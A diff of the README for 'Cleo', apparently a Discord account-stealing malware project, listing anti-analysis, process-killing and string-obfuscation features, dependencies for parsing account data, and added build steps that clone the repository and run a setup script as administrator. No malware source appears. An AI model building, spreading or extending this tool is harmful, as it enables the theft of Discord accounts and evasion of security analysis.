@@ -22,15 +22,6 @@ Anti Analysis | Checks if an analyzing process is open. (exits if detected).
 Watch Dog | Runs anti analysis in a new thread, kills blacklisted process if open.
 Obfuscation | Automatic compile-time string obfuscation.
 
-# Update Notes
-     - Compile-time string obfuscator
-     - Process watch dog
-     - Anti debug, anti analyzing, & better anti virtual machine
-     - Infects discord installations
-     - Better webhook report format
-     - Code is cleaned up
-     - Much more
-     
 # Dependencies
 All things here can be installed automatically by running the powershell script [here](https://github.com/dehoisted/Cleo/blob/main/install_dependencies.ps1).
 + [LibCurl](https://curl.se/libcurl/c/) - Used by CPR behind the scenes.
@@ -38,7 +29,17 @@ All things here can be installed automatically by running the powershell script 
 + [JSON Parser](https://github.com/nlohmann/json) - For parsing discord account information.
 + [String Obfuscator](https://github.com/adamyaxley/Obfuscate) - Used for hiding important strings. (already in Cleo source as "AY_Obfuscate.h")
 
+# Building
+In order to build Cleo you must first install the needed dependencies! **This is vital to ensure you don't make a false issue**
+
+#### Use `git clone` to clone the repository!
+```
+git clone https://github.com/dehoisted/Cleo.git
+cd ./Cleo
+```
+
+When running the powershell script **run it as administrator**.
+
 # Credits                                                                                                                                               
 + [Dehoisted](https://github.com/dehoisted) - Making all of Cleo V5.                                                                                   
-+ [Passive](https://github.com/Passive) - Making other versions & coming up with the idea for Cleo itself.                                                                         
-+ Penguin Sec 💯
++ [Passive](https://github.com/Passive) - Making other versions & coming up with the idea for Cleo itself.                                                               
